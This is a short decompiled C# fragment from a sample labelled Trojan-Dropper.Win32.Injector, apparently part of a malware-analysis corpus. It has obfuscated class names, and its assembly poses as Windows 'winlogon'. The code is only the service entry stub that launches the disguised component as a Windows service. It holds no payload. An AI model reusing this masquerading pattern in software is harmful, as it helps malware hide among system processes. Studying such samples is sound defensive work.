﻿// Decompiled with JetBrains decompiler
// Type: I5MT9LaeML49aNcXgE.mD4HVhAWKOmGVgg83I
// Assembly: winlogon, Version=6.1.7601.17514, Culture=neutral, PublicKeyToken=null
// MVID: AC059A05-C181-4518-A4B8-9A5E8B3420DD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Dropper.Win32.Injector.famp-6427595611179d5d5dac279b1a45e8419adb3bb7a48e56b0dc2408b6a417bbb5.exe

using System.Runtime.CompilerServices;
using System.ServiceProcess;

namespace I5MT9LaeML49aNcXgE
{
  internal static class mD4HVhAWKOmGVgg83I
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void wcfHflXeE() => ServiceBase.Run(new ServiceBase[1]
    {
      (ServiceBase) new winlogon.winlogon()
    });
  }
}